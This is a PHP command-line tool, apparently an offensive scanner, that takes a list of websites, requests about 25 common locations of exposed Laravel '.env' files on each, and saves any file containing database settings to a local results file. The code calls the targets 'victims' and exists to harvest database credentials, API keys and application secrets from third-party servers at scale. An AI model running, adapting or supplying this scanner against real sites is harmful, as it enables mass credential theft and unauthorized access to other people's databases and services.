<?php

// Laravel Environment Scanner
// Code by Monkey B Luffy
// https://github.com/Florienzh4x
// Special thanks for CEPOT

class Florienzh_ENV{
		public $site;

		public function simpen($text, $nama){
			$xyz = fopen($nama, "a+");
				   fwrite($xyz, "$text\n");
				   fclose($xyz);
		}
		public function cURL($targetmu){
			$get = curl_init();
				   curl_setopt($get, CURLOPT_URL, $targetmu);
				   curl_setopt($get, CURLOPT_RETURNTRANSFER, 1);
				   curl_setopt($get, CURLOPT_FOLLOWLOCATION, 1);
				   curl_setopt($get, CURLOPT_CUSTOMREQUEST, "GET");
				   curl_setopt($get, CURLOPT_USERAGENT, "Florienzh/1.0");
				   curl_setopt($get, CURLOPT_SSL_VERIFYPEER, 0);
				   curl_setopt($get, CURLOPT_SSL_VERIFYHOST, 0);
				   curl_setopt($get, CURLOPT_CONNECTTIMEOUT, 5);
				   curl_setopt($get, CURLOPT_TIMEOUT, 5);
			$result = curl_exec($get);
			return $result;
		}
		public function CekEnv(){
			$path = array( ".env", "vendor/.env", "lib/.env", "lab/.env",  "cronlab/.env", "cron/.env", "core/.env", "core/app/.env", "core/Database/.env", "database/.env", "config/.env", "assets/.env", "app/.env", "apps/.env", "uploads/.env", "sitemaps/.env", "site/.env", "admin/.env", "web/.env", "public/.env", "en/.env", "tools/.env", "v1/.env", "administrator/.env", "laravel/.env" );
			foreach ($path as $pathnya) {
				for ($xx=0; $xx < $pathnya; $xx++);
					$korban = $this->site."/".$pathnya;
					$cekfile = $this->cURL($korban);
					if (strpos($cekfile, "DB_DATABASE")) {
						echo "    ".$korban." [FOUND]\n";
					$textfile = "[=] site: $korban
".$cekfile."
========================================================";
						$this->simpen($textfile, "Result.txt");
					} else {
						echo "    ".$korban." [NOT FOUND]\n";
					}
				}
			}
		}
$Banner = "________________________________
< Laravel Environment Scanner >
< ".get_current_user()."@".gethostname()." > 
--------------------------------
\
 \
     .--.
    |o_o |
    |:_/ |
   //   \ \
  (|     | )
 /\'\_   _/`\
 \___)=(___/

";

$ngecek = new Florienzh_ENV();

echo $Banner."\n\n\n";

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt\n");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." Not Found!!");
$list = explode("\n", file_get_contents($argv[1]));

foreach ($list as $korbanku){
	$ngecek->site = trim($korbanku);

    echo "[=] Target: ".$korbanku."\n";
    $ngecek->CekEnv();
}
?>